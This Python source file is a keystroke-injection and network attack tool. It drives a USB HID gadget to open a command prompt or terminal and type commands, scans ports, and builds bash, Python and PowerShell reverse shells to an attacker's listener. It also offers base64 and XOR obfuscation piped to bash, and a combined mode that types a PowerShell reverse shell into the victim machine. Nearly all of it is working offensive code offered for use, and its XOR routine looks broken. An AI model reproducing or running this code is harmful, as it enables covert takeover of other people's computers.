#!/usr/bin/env python3
"""
Combined USB + Network Attack Framework
Real offensive capabilities for advanced security testing
"""

import argparse
import socket
import time
import random
import os
import sys
import subprocess
from fcntl import ioctl
import struct
import base64

# USB HID Keyboard Codes
KEY_CODES = {
    'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9, 'g': 10, 'h': 11,
    'i': 12, 'j': 13, 'k': 14, 'l': 15, 'm': 16, 'n': 17, 'o': 18, 'p': 19,
    'q': 20, 'r': 21, 's': 22, 't': 23, 'u': 24, 'v': 25, 'w': 26, 'x': 27,
    'y': 28, 'z': 29, '1': 30, '2': 31, '3': 32, '4': 33, '5': 34, '6': 35,
    '7': 36, '8': 37, '9': 38, '0': 39, 'ENTER': 40, 'ESC': 41, 'BACKSPACE': 42,
    'TAB': 43, 'SPACE': 44, 'MINUS': 45, 'EQUAL': 46, 'LEFTBRACE': 47,
    'RIGHTBRACE': 48, 'BACKSLASH': 49, 'SEMICOLON': 51, 'APOSTROPHE': 52,
    'GRAVE': 53, 'COMMA': 54, 'DOT': 55, 'SLASH': 56, 'CAPSLOCK': 57
}

# Modifier keys
MODIFIERS = {
    'CTRL': 0x01,
    'SHIFT': 0x02,
    'ALT': 0x04,
    'META': 0x08
}

class CombinedAttackFramework:
    def __init__(self):
        self.usb_device = "/dev/hidg0"
        self.network_timeout = 2
        self.usb_fd = None
        self.open_usb_device()

    def open_usb_device(self):
        try:
            self.usb_fd = open(self.usb_device, 'wb')
        except Exception as e:
            print(f"[!] USB HID device error: {e}")
            self.usb_fd = None

    def send_usb_report(self, modifier, key):
        if not self.usb_fd:
            return
        report = bytes([modifier, 0, key, 0, 0, 0, 0, 0])
        self.usb_fd.write(report)
        self.usb_fd.flush()
        time.sleep(0.01)
        # Release keys
        self.usb_fd.write(bytes([0, 0, 0, 0, 0, 0, 0, 0]))
        self.usb_fd.flush()

    def press_key(self, key, modifier=0):
        if key in KEY_CODES:
            self.send_usb_report(modifier, KEY_CODES[key])
        elif key.upper() in KEY_CODES:
            self.send_usb_report(MODIFIERS['SHIFT'], KEY_CODES[key.upper()])

    def type_string(self, string, delay=0.05):
        for char in string:
            if char == '\n':
                self.press_key('ENTER')
            elif char == ' ':
                self.press_key('SPACE')
            elif char == '\t':
                self.press_key('TAB')
            else:
                self.press_key(char)
            time.sleep(delay)

    def execute_usb_command(self, command, platform="windows"):
        if platform == "windows":
            # Open command prompt
            self.press_key('r', MODIFIERS['META'])
            time.sleep(0.5)
            self.type_string("cmd\n")
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")
        elif platform == "linux":
            # Open terminal
            self.press_key('t', MODIFIERS['CTRL'] | MODIFIERS['ALT'])
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")

    def port_scan(self, target, ports):
        print(f"[+] Scanning {target}")
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.network_timeout)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"[+] Port {port} open")
                sock.close()
            except:
                pass
        
        return open_ports

    def generate_reverse_shell(self, lhost, lport, shell_type="bash"):
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'powershell': f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""
        }
        return shells.get(shell_type, shells['bash'])

    def obfuscate_payload(self, payload, method="base64"):
        if method == "base64":
            return f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | bash"
        elif method == "xor":
            key = random.randint(1, 255)
            encrypted = [ord(c) ^ key for c in payload]
            return f"echo {encrypted} | python3 -c \"print(''.join([chr(int(c)^{key}) for c in input().split()]))\" | bash"
        return payload

    def combined_attack(self, target_ip, lhost, lport):
        print("[+] Starting combined USB + Network attack")
        
        # Step 1: Network reconnaissance
        print("[+] Network reconnaissance phase")
        open_ports = self.port_scan(target_ip, [22, 80, 443, 445, 3389, 8080])
        
        # Step 2: USB attack - open terminal
        print("[+] USB attack phase - opening terminal")
        self.execute_usb_command("", "windows")
        time.sleep(1)
        
        # Step 3: USB attack - execute reverse shell
        print("[+] USB attack phase - executing reverse shell")
        shell = self.generate_reverse_shell(lhost, lport, "powershell")
        self.type_string(shell + "\n")
        
        # Step 4: Network confirmation
        print("[+] Network confirmation phase")
        if 4444 in self.port_scan(lhost, [4444]):
            print("[+] Reverse shell connection established")
        else:
            print("[-] Reverse shell connection not detected")

    def close(self):
        if self.usb_fd:
            self.usb_fd.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Combined USB + Network Attack Framework")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # USB commands
    usb_parser = subparsers.add_parser('usb', help='USB HID attacks')
    usb_subparsers = usb_parser.add_subparsers(dest='usb_command')
    
    type_parser = usb_subparsers.add_parser('type', help='Type text via USB')
    type_parser.add_argument('text', help='Text to type')
    type_parser.add_argument('--delay', type=float, default=0.05, help='Delay between keystrokes')
    
    exec_parser = usb_subparsers.add_parser('exec', help='Execute command via USB')
    exec_parser.add_argument('command', help='Command to execute')
    exec_parser.add_argument('--platform', choices=['windows', 'linux'], default='windows', help='Target platform')
    
    # Network commands
    net_parser = subparsers.add_parser('net', help='Network attacks')
    net_subparsers = net_parser.add_subparsers(dest='net_command')
    
    scan_parser = net_subparsers.add_parser('scan', help='Port scanner')
    scan_parser.add_argument('target', help='Target IP')
    scan_parser.add_argument('ports', help='Ports to scan (e.g., 1-1000 or 22,80,443)')
    
    shell_parser = net_subparsers.add_parser('shell', help='Generate reverse shell')
    shell_parser.add_argument('lhost', help='Listener IP')
    shell_parser.add_argument('lport', type=int, help='Listener port')
    shell_parser.add_argument('--type', choices=['bash', 'python', 'powershell'], default='bash', help='Shell type')
    
    # Combined attack
    combined_parser = subparsers.add_parser('combined', help='Combined USB + Network attack')
    combined_parser.add_argument('target_ip', help='Target IP for network scanning')
    combined_parser.add_argument('lhost', help='Listener IP for reverse shell')
    combined_parser.add_argument('lport', type=int, help='Listener port for reverse shell')
    
    args = parser.parse_args()
    
    attack = CombinedAttackFramework()
    
    try:
        if args.command == 'usb':
            if args.usb_command == 'type':
                print(f"[+] Typing via USB: {args.text}")
                attack.type_string(args.text, args.delay)
            elif args.usb_command == 'exec':
                print(f"[+] Executing via USB: {args.command}")
                attack.execute_usb_command(args.command, args.platform)
        
        elif args.command == 'net':
            if args.net_command == 'scan':
                if '-' in args.ports:
                    start, end = map(int, args.ports.split('-'))
                    ports = range(start, end + 1)
                else:
                    ports = [int(p) for p in args.ports.split(',')]
                attack.port_scan(args.target, ports)
            elif args.net_command == 'shell':
                shell = attack.generate_reverse_shell(args.lhost, args.lport, args.type)
                print(f"[+] Reverse shell payload:\n{shell}")
                obfuscated = attack.obfuscate_payload(shell)
                print(f"[+] Obfuscated payload:\n{obfuscated}")
        
        elif args.command == 'combined':
            attack.combined_attack(args.target_ip, args.lhost, args.lport)
    
    finally:
        attack.close()
